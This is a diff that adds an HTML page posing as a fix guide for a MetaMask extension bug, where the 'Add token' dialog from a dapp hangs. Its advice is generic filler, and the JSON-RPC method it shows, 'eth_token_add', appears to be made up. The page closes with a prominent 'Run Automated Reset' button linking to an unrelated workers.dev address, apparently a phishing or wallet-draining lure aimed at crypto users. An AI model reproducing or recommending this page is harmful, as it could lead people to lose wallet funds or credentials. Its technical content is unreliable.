@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog – Fix Guide</title>
+<style>
+    body {
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: none;
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #00adb5; }
+    .btn {
+        background: #ff7b2c;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users are faced with a persistent "Add token" page when attempting to confirm the addition of a token from a decentralized application (dapp) using the Metamask extension on the Ethereum (ETH) ecosystem. The dialog box fails to proceed, resulting in an inability to complete the token addition process.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The issue arises from a bug within the Metamask extension, specifically related to the handling of token addition requests from dapps. This bug prevents the extension from properly confirming and completing the token addition process, leading to the stuck "Add token" page.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To bypass this issue, users can attempt the following manual overrides:</li>
+<li>Manually input the token's contract address and other details to add it without relying on the dapp's request.</li>
+<li>Utilize the Metamask extension's debug mode to identify and potentially resolve the issue.</li>
+<li>Execute a custom JSON-RPC request to add the token, as shown in the following code block:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_token_add&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">&quot;0x...token_contract_address...&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;Token Name&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;Token Symbol&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="mi">18</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Prerequisites:
+- Metamask extension installed and configured.
+- Ethereum network selected.
+- Dapp properly configured to interact with the Metamask extension.
+For further troubleshooting, consider utilizing an external Ethereum console for more advanced debugging capabilities.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
